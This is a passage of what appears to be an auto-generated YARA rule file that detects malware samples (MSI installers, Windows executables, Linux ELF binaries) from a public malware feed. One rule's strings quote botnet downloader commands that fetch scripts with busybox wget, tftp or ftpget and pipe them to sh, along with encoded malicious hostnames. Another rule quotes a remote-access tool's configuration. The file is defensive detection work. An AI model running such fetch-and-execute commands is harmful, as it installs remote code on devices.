      description = "evidences - from files 0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219.msi, 3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5.msi, 394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba.msi, 4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312.msi, 4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38.msi, 50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b.msi, 5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2.msi, 635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a.msi, 637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61.msi, 66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352.msi, 67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73.msi, 702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37.msi, 781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143.msi, 871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857.msi, 91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624.msi, 98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585.msi, 99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1.msi, be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8.msi, ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62.msi, cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891.msi, d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd.msi, e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778.msi, f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219"
      hash2 = "3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5"
      hash3 = "394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba"
      hash4 = "4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312"
      hash5 = "4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38"
      hash6 = "50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b"
      hash7 = "5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2"
      hash8 = "635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a"
      hash9 = "637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61"
      hash10 = "66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352"
      hash11 = "67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73"
      hash12 = "702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37"
      hash13 = "781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143"
      hash14 = "871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857"
      hash15 = "91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624"
      hash16 = "98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585"
      hash17 = "99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1"
      hash18 = "be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8"
      hash19 = "ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62"
      hash20 = "cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891"
      hash21 = "d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd"
      hash22 = "e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778"
      hash23 = "f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "Update.dll" fullword ascii
      $s6 = "get_loader_name_from_dll" fullword ascii
      $s7 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s8 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s9 = "process_config_directive" fullword ascii
      $s10 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s11 = "qgethostname" fullword ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s14 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s15 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
      $s16 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s17 = "qregexec" fullword ascii
      $s18 = "vloader_failure" fullword ascii
      $s19 = "check_process_exit" fullword ascii
      $s20 = "set_processor_type" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5_cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e_1 {
   meta:
      description = "evidences - from files 3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5.msi, cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5"
      hash2 = "cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{56705450-CFCF-4367-A42C-4F4D273C6991}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = ")$H:z:\"" fullword ascii
      $s4 = "wlM.WrE" fullword ascii
      $s5 = "Cmdm/(A" fullword ascii
      $s6 = "-->A^G" fullword ascii
      $s7 = "GEt  Y" fullword ascii
      $s8 = "\\PWOqU|T" fullword ascii
      $s9 = "F- pNR7" fullword ascii
      $s10 = "QjgjMY7" fullword ascii
      $s11 = "cU%J%:" fullword ascii
      $s12 = "fgvogx" fullword ascii
      $s13 = "qoU -U" fullword ascii
      $s14 = "~~\\; -" fullword ascii
      $s15 = "- 1fgmW^1" fullword ascii
      $s16 = "M\\=F6P!." fullword ascii
      $s17 = "?'* E'" fullword ascii
      $s18 = "DGy -IY" fullword ascii
      $s19 = "# eR)+" fullword ascii
      $s20 = "% -%+)" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38_781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc_2 {
   meta:
      description = "evidences - from files 4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38.msi, 781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143.msi, 91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624.msi, be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38"
      hash2 = "781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143"
      hash3 = "91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624"
      hash4 = "be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{8ED2CC60-09FB-42CC-99E9-6898C8DAB6E4}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "Z:\\7@k" fullword ascii
      $s4 = "#GetyH9" fullword ascii
      $s5 = "0f]M!." fullword ascii
      $s6 = "yhuh8758" fullword ascii
      $s7 = "+ {\\$m" fullword ascii
      $s8 = "_7!* 2HFQ>PK" fullword ascii
      $s9 = "iu;) -" fullword ascii
      $s10 = "y(k++ " fullword ascii
      $s11 = "nJKcYBY2" fullword ascii
      $s12 = "-uj- ?" fullword ascii
      $s13 = "opwASS4" fullword ascii
      $s14 = "\\uiGE& p " fullword ascii
      $s15 = "nhuQUp3" fullword ascii
      $s16 = "o!F\"- x" fullword ascii
      $s17 = " -N`Ui" fullword ascii
      $s18 = "# V6vDn" fullword ascii
      $s19 = "QN91* " fullword ascii
      $s20 = "scO)- V" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1_f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c_3 {
   meta:
      description = "evidences - from files 99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1.msi, f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1"
      hash2 = "f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{6FD5157D-5281-4531-871C-7DF4E181874B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "55'\"~].}" fullword ascii /* hex encoded string 'U' */
      $s4 = "1@0f:\\3JM" fullword ascii
      $s5 = "\\.\"9)?" fullword ascii
      $s6 = "Y3 T:\"" fullword ascii
      $s7 = "S=A+ ;6V" fullword ascii
      $s8 = "sVqsMY34" fullword ascii
      $s9 = "lqjzpa" fullword ascii
      $s10 = "XVJLcE39" fullword ascii
      $s11 = "bUhiRQ2" fullword ascii
      $s12 = "WI.%* u" fullword ascii
      $s13 = "219Rh8$ -" fullword ascii
      $s14 = "X -~&)" fullword ascii
      $s15 = "SGGUTx9" fullword ascii
      $s16 = "pDSBpF4" fullword ascii
      $s17 = "29N+ !*)" fullword ascii
      $s18 = "NGV -Uw" fullword ascii
      $s19 = "Z!Xo`+ A(@" fullword ascii
      $s20 = "\\WmIf_$d" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857_98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc_4 {
   meta:
      description = "evidences - from files 871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857.msi, 98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857"
      hash2 = "98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "cNiS:\"" fullword ascii
      $s3 = "* 8C7=" fullword ascii
      $s4 = ";oftP>^j" fullword ascii
      $s5 = "roductCode{151028AD-E0D2-409C-B3EC-8348C68EAD59}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s6 = "wchywdw" fullword ascii
      $s7 = "ErcCmd>" fullword ascii
      $s8 = "AT:\"_pwJ" fullword ascii
      $s9 = "L:\"sH$xMm" fullword ascii
      $s10 = "EEdll)" fullword ascii
      $s11 = "\\PzZd<DmT" fullword ascii
      $s12 = "f* FHsH" fullword ascii
      $s13 = "\\btnAp+_" fullword ascii
      $s14 = "vCvcQcY2" fullword ascii
      $s15 = " >%vfC%" fullword ascii
      $s16 = "+ Ry*i3" fullword ascii
      $s17 = ")j- Xa" fullword ascii
      $s18 = "9_ /SV" fullword ascii
      $s19 = "CWNiHj9" fullword ascii
      $s20 = "2 /h\"u" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba_66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215cc_5 {
   meta:
      description = "evidences - from files 394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba.msi, 66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba"
      hash2 = "66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "TQZF:\"a" fullword ascii
      $s3 = "5_=<\"e5a" fullword ascii /* hex encoded string '^Z' */
      $s4 = "jYGC!." fullword ascii
      $s5 = "L:\"VMo" fullword ascii
      $s6 = "T:\\Q0N" fullword ascii
      $s7 = "glaf.GzSr" fullword ascii
      $s8 = "h%HYS%v!" fullword ascii
      $s9 = "SGNZA46" fullword ascii
      $s10 = "VkZeUa6" fullword ascii
      $s11 = "roductCode{60061CAF-7DA8-4838-A14F-7721F9D157C3}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s12 = "Sw-;+ " fullword ascii
      $s13 = ",h* |r" fullword ascii
      $s14 = "/|- 8VU" fullword ascii
      $s15 = "0- ;\\\\" fullword ascii
      $s16 = "I- e~){" fullword ascii
      $s17 = "||b /E5" fullword ascii
      $s18 = "w /IOq" fullword ascii
      $s19 = "! -vaE" fullword ascii
      $s20 = "L  /Rg" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37_e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836c_6 {
   meta:
      description = "evidences - from files 702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37.msi, e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37"
      hash2 = "e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{C9852F2D-9C94-439A-AEE5-EAA229EB26AD}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "e:\"]3m" fullword ascii
      $s4 = "(ZAi:\"b" fullword ascii
      $s5 = "aOLoG>" fullword ascii
      $s6 = "Nueyktyy" fullword ascii
      $s7 = "TQgBzQ6" fullword ascii
      $s8 = "QmEp261" fullword ascii
      $s9 = "B* eyf" fullword ascii
      $s10 = "2%Osm%" fullword ascii
      $s11 = "`}y+ I" fullword ascii
      $s12 = "kkSRhm8" fullword ascii
      $s13 = "nb` -4(" fullword ascii
      $s14 = "dhMZHi5" fullword ascii
      $s15 = "xo/o /d" fullword ascii
      $s16 = "u/y%t%" fullword ascii
      $s17 = "\\}^cxTfw!" fullword ascii
      $s18 = "hKx/m /f" fullword ascii
      $s19 = "ywMN\"W" fullword ascii
      $s20 = "hjad)tl" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2_ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb22_7 {
   meta:
      description = "evidences - from files 5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2.msi, ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2"
      hash2 = "ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{0918528B-E90E-41BD-B88D-2F886F744833}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "D:U:\"69y,X" fullword ascii
      $s4 = "y:\"[IW." fullword ascii
      $s5 = "Q9X.zlV" fullword ascii
      $s6 = "DVv.Zbp" fullword ascii
      $s7 = "hqwivl" fullword ascii
      $s8 = "(3e* M" fullword ascii
      $s9 = "AMukzH2" fullword ascii
      $s10 = ",+ :Ja" fullword ascii
      $s11 = "mDpMhDIK0" fullword ascii
      $s12 = "jRmCys0" fullword ascii
      $s13 = "AC$2+ ," fullword ascii
      $s14 = ".X.DwU`x8F" fullword ascii
      $s15 = "KOnG8Qj" fullword ascii
      $s16 = "LUOH=va" fullword ascii
      $s17 = "rfBFg J" fullword ascii
      $s18 = "ptTm\"5" fullword ascii
      $s19 = "./CweohG`" fullword ascii
      $s20 = "PPMbm#'" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 25000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b_6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea_8 {
   meta:
      description = "evidences - from files 27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b.msi, 6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334.msi, b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b"
      hash2 = "6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334"
      hash3 = "b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b"
   strings:
      $x1 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $s2 = "failed to get WixShellExecBinaryId" fullword ascii
      $s3 = "failed to process target from CustomActionData" fullword ascii
      $s4 = "failed to get handle to kernel32.dll" fullword ascii
      $s5 = "failed to get security descriptor's DACL - error code: %d" fullword ascii
      $s6 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s7 = "failed to get WixShellExecTarget" fullword ascii
      $s8 = "App: %ls found running, %d processes, attempting to send message." fullword ascii
      $s9 = "Command failed to execute." fullword ascii
      $s10 = "failed to schedule ExecServiceConfig action" fullword ascii
      $s11 = "failed to openexecute temp view with query %ls" fullword ascii
      $s12 = "failed to get message to send to users when server reboots due to service failure." fullword ascii
      $s13 = "WixShellExecTarget is %ls" fullword ascii
      $s14 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s15 = "WixShellExecTarget" fullword wide
      $s16 = "failed to get reset period in days between service restart attempts." fullword ascii
      $s17 = "failed to schedule ExecXmlConfig action" fullword ascii
      $s18 = "failed to schedule ExecXmlConfigRollback for file: %ls" fullword ascii
      $s19 = "Attempting to send process id 0x%x message id: %u" fullword ascii
      $s20 = "Failed in ExecCommon64 method" fullword ascii
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 16000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8_fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af4_9 {
   meta:
      description = "evidences - from files a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8.exe, fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af45ba0dd.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8"
      hash2 = "fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af45ba0dd"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii
      $s2 = "yIdentity type=\"win32\" name=\"Getscreen\" version=\"0.1.0.0\" processorArchitecture=\"*\"></assemblyIdentity><description>Gets" ascii
      $s3 = "getscreen.exe" fullword wide
      $s4 = "ndency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asI" ascii
      $s5 = "\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"></assemblyIdentity></dependentAssembl" ascii
      $s6 = "!http://ocsp.globalsign.com/rootr30;" fullword ascii
      $s7 = "rosoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">True/PM</dpiAware" ascii
      $s8 = "%http://crl.globalsign.com/root-r3.crl0G" fullword ascii
      $s9 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii
      $s10 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii
      $s11 = "ent</description><dependency><dependentAssembly><assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls\" vers" ascii
      $s12 = "/http://secure.globalsign.com/cacert/root-r3.crt06" fullword ascii
      $s13 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii
      $s14 = "ker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><application xmlns=\"urn:schemas" ascii
      $s15 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii
      $s16 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii
      $s17 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii
      $s18 = "{\"srv\":\"getscreen.me\",\"turbo\":\"2203681736138584UtEFjbrdjMX3qgoXgI9f\",\"user\":\"sl mfe\"}" fullword ascii
      $s19 = "|l\\L<," fullword ascii /* reversed goodware string ',<L\\l|' */
      $s20 = "ty:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f_a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962a_10 {
   meta:
      description = "evidences - from files 8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f.elf, a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e.elf, b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f"
      hash2 = "a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e"
      hash3 = "b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09"
   strings:
      $s1 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s6 = "/bin/busybox wget http://" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "L21udC9tdGQvYXBw" fullword ascii /* base64 encoded string '/mnt/mtd/app' */
      $s9 = "L3Vzci9saWJleGVjLwAA" fullword ascii /* base64 encoded string '/usr/libexec/  ' */
      $s10 = "L2hvbWUvZGF2aW5jaQAA" fullword ascii /* base64 encoded string '/home/davinci  ' */
      $s11 = "L3Vzci9saWIA" fullword ascii /* base64 encoded string '/usr/lib ' */
      $s12 = "L2hvbWUvaGVscGVy" fullword ascii /* base64 encoded string '/home/helper' */
      $s13 = "d3d3Lm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'www.onlydance.cam ' */
      $s14 = "L3Vzci9ldGMA" fullword ascii /* base64 encoded string '/usr/etc ' */
      $s15 = "L2hvbWUvcHJvY2VzcwAA" fullword ascii /* base64 encoded string '/home/process  ' */
      $s16 = "L3Vzci9zYmlu" fullword ascii /* base64 encoded string '/usr/sbin' */
      $s17 = "L3Zhci9Tb2ZpYQAA" fullword ascii /* base64 encoded string '/var/Sofia  ' */
      $s18 = "ZGViLm9ubHlkYW5jZS5jYW0A" fullword ascii /* base64 encoded string 'deb.onlydance.cam ' */
      $s19 = "L3Vzci9iaW4A" fullword ascii /* base64 encoded string '/usr/bin ' */
      $s20 = "L3ovemJpbgAA" fullword ascii /* base64 encoded string '/z/zbin  ' */
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b_6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea_11 {
   meta:
      description = "evidences - from files 27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b.msi, 6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b"
      hash2 = "6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334"
   strings:
      $x1 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\shellexecca.cpp" fullword ascii
      $s2 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\serviceconfig.cpp" fullword ascii
      $s3 = "c:\\agent\\_work\\66\\s\\src\\libs\\wcautil\\qtexec.cpp" fullword ascii
      $s4 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\xmlconfig.cpp" fullword ascii
      $s5 = "c:\\agent\\_work\\66\\s\\src\\libs\\wcautil\\wcascript.cpp" fullword ascii
